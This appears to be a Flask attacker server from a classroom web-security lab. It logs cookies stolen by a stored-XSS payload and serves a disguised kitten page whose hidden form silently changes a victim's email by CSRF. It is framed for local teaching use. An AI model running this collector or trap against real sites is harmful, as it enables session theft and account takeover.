"""
evil.com — the attacker's collection server for the Chirp demo.

Runs on port 6001, separate from the victim app (127.0.0.1:5050). It exists
so cookie theft is shown END TO END (stolen cookies land here), instead of
just printing document.cookie in the victim's own console.

    python evil_server.py

⚠️  For authorized classroom use against the local Chirp app ONLY.
"""
import datetime
import os

from flask import Flask, request

app = Flask(__name__)
TARGET = "http://127.0.0.1:5050"
LOG = os.path.join(os.path.dirname(__file__), "stolen.log")


@app.route("/steal")
def steal():
    """Stored-XSS payload beacons the victim's cookie here as ?c=..."""
    cookie = request.args.get("c", "")
    stamp = datetime.datetime.now().isoformat(timespec="seconds")
    line = "[%s] STOLEN from %s : %s" % (stamp, request.remote_addr, cookie)
    print("\n" + line, flush=True)
    with open(LOG, "a") as f:
        f.write(line + "\n")
    return "", 204  # empty response; the victim never notices


@app.route("/csrf_poc.html")
def csrf_poc():
    """A booby-trapped page. Just visiting it (while logged into Chirp)
    silently changes the victim's email to the attacker's — classic CSRF."""
    return """<!DOCTYPE html>
<html><body>
  <h1>😻 Cute Kittens</h1>
  <p>Enjoy these free kittens while this totally normal page loads...</p>
  <form id="f" action="%s/change_email" method="POST">
    <input type="hidden" name="new_email" value="attacker@evil.com">
  </form>
  <script>document.getElementById('f').submit();</script>
</body></html>""" % TARGET


@app.route("/")
def index():
    return ("evil.com attacker server.<br>"
            "Endpoints: <code>/steal?c=...</code> (cookie drop), "
            "<code>/csrf_poc.html</code> (CSRF trap). "
            "Stolen cookies are logged to attacker/stolen.log.")


if __name__ == "__main__":
    print("evil.com listening on http://127.0.0.1:6001  (logging to %s)" % LOG)
    app.run(host="127.0.0.1", port=6001, debug=True)
